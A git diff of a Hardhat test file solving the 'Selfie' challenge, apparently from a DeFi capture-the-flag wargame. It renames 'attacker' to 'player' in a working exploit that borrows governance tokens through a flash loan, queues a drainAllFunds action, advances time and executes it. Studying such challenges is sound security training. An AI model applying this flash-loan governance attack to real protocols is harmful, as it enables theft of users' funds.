@@ -42,13 +42,13 @@ describe('[Challenge] Selfie', function () {
     /**
      * It's really silly to apply governance on a contract that uses the same
      * asset to give flashloans. You can ask for a flashLoan at max. cap., and
-     * then queue an action that all funds must be drained to the attacker address.
+     * then queue an action that all funds must be drained to the player address.
      * Wait for 2 days and that would be it.
      *
      * 1. Create a contract receiver.
      * 2. Ask for a flashloan.
      * 3. ReceiveTokens and take a snapshot, since it's a public function.
-     * 4. queue an action to drainAllFunds to attacker.address.
+     * 4. queue an action to drainAllFunds to player.address.
      * 5. Return tokens.
      * 6. Wait 2 days.
      * 7. Profit
@@ -56,12 +56,12 @@ describe('[Challenge] Selfie', function () {
 
     const ExploitSelfieFactory = await ethers.getContractFactory(
       "ExploitSelfie",
-      attacker
+      player
     );
     const exploitSelfie = await ExploitSelfieFactory.deploy(
-      this.pool.address,
-      this.governance.address,
-      this.token.address
+      pool.address,
+      governance.address,
+      token.address
     );
     
     await exploitSelfie.flashLoan();
@@ -69,8 +69,8 @@ describe('[Challenge] Selfie', function () {
     await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
 
     let actionExploitId = await exploitSelfie.getExploitActionId();
-    this.governance = this.governance.connect(attacker);
-    this.governance.executeAction(actionExploitId);
+    governance = governance.connect(player);
+    governance.executeAction(actionExploitId);
   });
 
     after(async function () {
